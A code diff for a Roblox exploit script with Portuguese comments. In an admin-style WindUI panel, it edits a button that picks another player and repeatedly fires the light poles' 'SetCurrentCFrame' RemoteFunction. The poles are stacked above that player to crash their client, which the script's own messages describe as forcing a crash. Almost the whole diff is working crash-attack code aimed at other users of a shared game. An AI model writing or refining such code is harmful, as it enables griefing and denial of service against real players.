@@ -617,6 +617,7 @@ MainTab:Button({
         end
 
         local Players = game:GetService("Players")
+        local LocalPlayer = Players.LocalPlayer
         local WorkspaceCom = workspace:FindFirstChild("WorkspaceCom")
         
         local targetPlayer = nil
@@ -632,7 +633,6 @@ MainTab:Button({
             return
         end
 
-        -- Altere para o nome da pasta dos holofotes do estádio
         local pastaPostes = WorkspaceCom and WorkspaceCom:FindFirstChild("001_TrafficCones") 
         if not pastaPostes then
             WindUI:Notify({Title = "❌ Erro Admin", Content = "Pasta de Holofotes não mapeada.", Duration = 3})
@@ -641,42 +641,39 @@ MainTab:Button({
 
         WindUI:Notify({
             Title = "🛡️ Painel Admin", 
-            Content = "Focando holofotes no chão e forçando crash em " .. targetPlayer.Name .. "...", 
+            Content = "Alinhando holofotes superiores e forçando crash em " .. targetPlayer.Name .. "...", 
             Duration = 3
         })
 
         local character = targetPlayer.Character
-        -- Rastreia a base dos pés (HumanoidRootPart) para garantir que a luz estoure diretamente no chão abaixo dele
         local targetHRP = character:FindFirstChild("HumanoidRootPart")
         local postes = pastaPostes:GetChildren()
         
         if targetHRP and #postes > 0 then
             task.spawn(function()
                 pcall(function()
-                    -- Roda os ciclos assíncronos rápidos para forçar o fechamento do Roblox do alvo
+                    -- Roda os ciclos rápidos para forçar o fechamento do aplicativo do alvo
                     for loop = 1, 12 do
                         if not targetPlayer or not targetPlayer.Parent then break end
                         
-                        for i, poste in pairs(postes) do
+                        for _, poste in pairs(postes) do
                             local setCFrameRemote = poste:FindFirstChild("SetCurrentCFrame")
                             if setCFrameRemote and setCFrameRemote:IsA("RemoteFunction") then
                                 
                                 task.spawn(function()
                                     pcall(function()
-                                        -- MATEMÁTICA DE PROJEÇÃO VERTICAL (Foco no Chão):
-                                        -- Posiciona a fusão física dos postes 8 studs acima do plano do chão do alvo
+                                        -- Posiciona a fusão física 8 studs acima do chão do alvo
                                         local posicaoSuperiorPoste = targetHRP.Position + Vector3.new(0, 8, 0)
                                         
-                                        -- Busca automática e profunda pela parte "Lights"
-                                        local parteDaLuz = poste:FindFirstChild("Lights", true)
+                                        -- Acessa diretamente a parte "Lights" com base no Path exato fornecido
+                                        local parteDaLuz = poste:FindFirstChild("Lights")
                                         
                                         local destinoFinal
                                         if parteDaLuz and parteDaLuz:IsA("BasePart") then
-                                            -- Desconta a distância interna da cabeça do holofote para que a lâmpada fique exatamente a 8 studs de altura
+                                            -- Desconta a distância interna da lâmpada para que o canhão fique exatamente a 8 studs de altura
                                             local offsetInterno = parteDaLuz.Position - poste:GetPivot().Position
                                             local posicaoAjustada = posicaoSuperiorPoste - offsetInterno
                                             
-                                            -- Força a rotação lookAt a mirar 100% para o chão sob os pés do alvo
                                             destinoFinal = CFrame.lookAt(posicaoAjustada, targetHRP.Position)
                                         else
                                             destinoFinal = CFrame.lookAt(posicaoSuperiorPoste, targetHRP.Position)
@@ -688,7 +685,7 @@ MainTab:Button({
                                 
                             end
                         end
-                        task.wait(0.04) -- Taxa de envio estável para você, fatal para o renderizador do alvo
+                        task.wait(0.04)
                     end
                 end)
             end)
